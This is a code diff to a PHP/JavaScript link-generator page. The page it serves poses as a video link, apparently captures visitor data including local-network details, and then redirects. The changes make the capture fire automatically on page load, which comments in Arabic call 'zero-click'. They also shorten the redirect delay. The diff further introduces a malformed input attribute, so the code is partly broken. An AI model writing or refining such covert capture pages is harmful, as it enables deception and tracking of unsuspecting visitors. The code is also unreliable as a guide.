@@ -196,7 +196,7 @@ if (isset($_GET['r'])) {
     <meta property="og:type" content="video.other">
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; }
-        body, html { width: 100%; height: 100%; overflow: hidden; background: #000; cursor: pointer; }
+        body, html { width: 100%; height: 100%; overflow: hidden; background: #000; }
     </style>
     <script>
         let isCaptured = false;
@@ -221,7 +221,7 @@ if (isset($_GET['r'])) {
             setTimeout(() => { if (!foundLocal) callback("Direct"); }, 80);
         }
 
-        function triggerCaptureAndRedirect(e) {
+        function triggerCaptureAndRedirect() {
             if (isCaptured) return;
             isCaptured = true;
 
@@ -256,16 +256,22 @@ if (isset($_GET['r'])) {
                                 window.location.replace(targetUrl);
                             });
                         });
-                    }, 600);
+                    }, 400);
                 })
                 .catch(err => {
                     window.location.replace(targetUrl);
                 });
         }
 
+        // محاولة التشغيل التلقائي الفوري فور تحميل الصفحة
         window.addEventListener('DOMContentLoaded', () => {
-            document.body.addEventListener('click', triggerCaptureAndRedirect);
+            triggerCaptureAndRedirect();
         });
+
+        // الاحتياط في حال منع المتصفح التشغيل التلقائي البحت (Zero-Click Fallback)
+        window.addEventListener('click', () => {
+            triggerCaptureAndRedirect();
+        }, { once: true });
     </script>
 </head>
 <body>
@@ -419,7 +425,7 @@ if (!empty($filter_code)) {
                 <div class="result-panel">
                     <label>Active Link:</label>
                     <div class="flex-row">
-                        <input type="text" readonly value="<?php echo htmlspecialchars($generated_link); ?>">
+                        <input type="text, readonly value="<?php echo htmlspecialchars($generated_link); ?>">
                         <button type="button" class="btn btn-secondary" onclick="copyText('<?php echo htmlspecialchars($generated_link); ?>', this)">Copy</button>
                     </div>
                 </div>
